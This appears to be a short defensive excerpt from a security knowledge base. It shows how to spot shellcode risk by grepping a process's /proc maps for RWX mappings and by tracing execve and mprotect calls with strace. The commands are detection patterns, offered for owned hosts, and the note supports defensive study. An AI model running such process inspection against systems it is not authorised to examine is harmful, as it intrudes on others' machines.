# 1) Check for RWX memory mappings in a process — shellcode/JIT-spray signal (own host)
grep -E 'rwxp' /proc/<PID>/maps && echo "RWX mapping -- W^X violation, shellcode surface"
# 2) Trace execve/mprotect calls to observe shellcode-execution behavior
strace -f -e trace=execve,mprotect ./target 2>&1 | grep -E "execve|PROT_EXEC"
#   Changing perms to PROT_EXEC then jumping is the classic shellcode pattern
```

> Shellcode defense depends on *whether executable memory is controlled* -- "we use NX" differs from "RWX mappings and execve behavior are detected and blocked". Observe directly with /proc maps and strace on owned hosts ([[06_Malware_Analysis]], [[09_Exploit_Techniques]], [[13_SOC_Blue_Team]]).
